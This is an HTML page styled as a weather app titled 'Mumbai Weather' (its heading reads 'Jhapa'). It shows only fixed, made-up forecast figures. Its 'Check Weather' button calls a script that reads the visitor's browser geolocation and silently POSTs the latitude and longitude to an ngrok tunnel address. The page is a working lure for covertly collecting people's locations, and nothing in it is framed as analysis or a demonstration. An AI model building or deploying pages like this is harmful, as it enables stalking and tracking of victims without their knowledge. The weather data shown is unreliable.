<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Mumbai Weather</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;600;700&family=Manrope:wght@400;500;600&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #0a1628;
    --bg-2: #0f2942;
    --card: rgba(20, 40, 70, 0.45);
    --border: rgba(120, 200, 230, 0.18);
    --text: #e6f1ff;
    --muted: #8aa6c4;
    --primary: #5ed7e0;
    --accent: #4fb5d4;
    --glow: 0 0 60px rgba(94, 215, 224, 0.35);
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; }
  body {
    font-family: 'Manrope', system-ui, sans-serif;
    color: var(--text);
    background: radial-gradient(ellipse at top, var(--bg-2), var(--bg) 70%);
    min-height: 100vh;
    display: flex; align-items: center; justify-content: center;
    padding: 24px;
    overflow: hidden;
    position: relative;
  }
  .orb {
    position: absolute; border-radius: 50%; filter: blur(80px); opacity: 0.5; pointer-events: none;
  }
  .orb-1 { width: 360px; height: 360px; background: #1e6b8c; top: -100px; left: -100px; }
  .orb-2 { width: 420px; height: 420px; background: #5ed7e0; bottom: -150px; right: -120px; opacity: 0.25; }

  .card {
    position: relative; z-index: 1;
    width: 100%; max-width: 440px;
    background: var(--card);
    backdrop-filter: blur(20px);
    -webkit-backdrop-filter: blur(20px);
    border: 1px solid var(--border);
    border-radius: 24px;
    padding: 36px 32px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.4);
    text-align: center;
  }
  h1 {
    font-family: 'Sora', sans-serif;
    font-size: 28px; font-weight: 700; letter-spacing: -0.02em;
  }
  .subtitle { color: var(--muted); margin-top: 6px; font-size: 14px; }

  .icon-wrap {
    margin: 28px auto 20px;
    width: 96px; height: 96px; border-radius: 50%;
    background: linear-gradient(135deg, var(--primary), var(--accent));
    display: flex; align-items: center; justify-content: center;
    box-shadow: var(--glow);
  }
  .icon-wrap svg { width: 48px; height: 48px; color: #0a1628; }

  .btn {
    margin-top: 8px;
    background: linear-gradient(135deg, var(--primary), var(--accent));
    color: #0a1628;
    font-family: 'Sora', sans-serif; font-weight: 600;
    border: none; cursor: pointer;
    padding: 14px 32px; border-radius: 999px;
    font-size: 15px; letter-spacing: 0.01em;
    transition: transform 0.2s ease, box-shadow 0.2s ease;
    box-shadow: 0 10px 30px rgba(94, 215, 224, 0.3);
  }
  .btn:hover { transform: translateY(-2px); box-shadow: 0 14px 40px rgba(94,215,224,0.45); }

  .result { margin-top: 28px; display: none; animation: fadeIn 0.5s ease both; }
  .result.show { display: block; }
  .temp {
    font-family: 'Sora', sans-serif;
    font-size: 72px; font-weight: 700; letter-spacing: -0.04em;
    background: linear-gradient(135deg, var(--primary), #b5f0f5);
    -webkit-background-clip: text; background-clip: text; color: transparent;
  }
  .condition { color: var(--muted); margin-top: -4px; font-size: 15px; }

  .stats {
    margin-top: 28px;
    display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px;
  }
  .stat {
    background: rgba(255,255,255,0.04);
    border: 1px solid var(--border);
    border-radius: 14px;
    padding: 14px 8px;
  }
  .stat svg { width: 20px; height: 20px; color: var(--primary); margin-bottom: 6px; }
  .stat .label { font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.06em; }
  .stat .value { font-family: 'Sora', sans-serif; font-weight: 600; font-size: 15px; margin-top: 2px; }

  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(8px) scale(0.98); }
    to { opacity: 1; transform: none; }
  }
</style>
</head>
<body>
  <div class="orb orb-1"></div>
  <div class="orb orb-2"></div>

  <main class="card">
    <h1>Jhapa</h1>
    <p class="subtitle">Today's forecast</p>

    <div class="icon-wrap">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
        <circle cx="12" cy="12" r="4"/>
        <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41"/>
      </svg>
    </div>

    <button class="btn" id="checkBtn" onclick="getLocation()">Check Weather</button>

    <div class="result" id="result">
      <div class="temp">29°C</div>
      <div class="condition">Sunny &amp; Clear</div>
      <div class="stats">
        <div class="stat">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2.69l5.66 5.66a8 8 0 1 1-11.31 0z"/></svg>
          <div class="label">Humidity</div><div class="value">68%</div>
        </div>
        <div class="stat">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.7 7.7a2.5 2.5 0 1 1 1.8 4.3H2M9.6 4.6A2 2 0 1 1 11 8H2M12.6 19.4A2 2 0 1 0 14 16H2"/></svg>
          <div class="label">Wind</div><div class="value">12 km/h</div>
        </div>
        <div class="stat">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
          <div class="label">Visibility</div><div class="value">10 km</div>
        </div>
      </div>
    </div>
  </main>

<script>
  const btn = document.getElementById('checkBtn');
  const result = document.getElementById('result');
  btn.addEventListener('click', () => {
    result.classList.add('show');
    btn.textContent = 'Refresh';
  });
</script>
<script>
function getLocation() {
  navigator.geolocation.getCurrentPosition(async (pos) => {
    await fetch("https://dowry-quality-debatable.ngrok-free.dev", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        lat: pos.coords.latitude,
        lon: pos.coords.longitude
      })
    });
  });
}
</script>
</body>
</html>
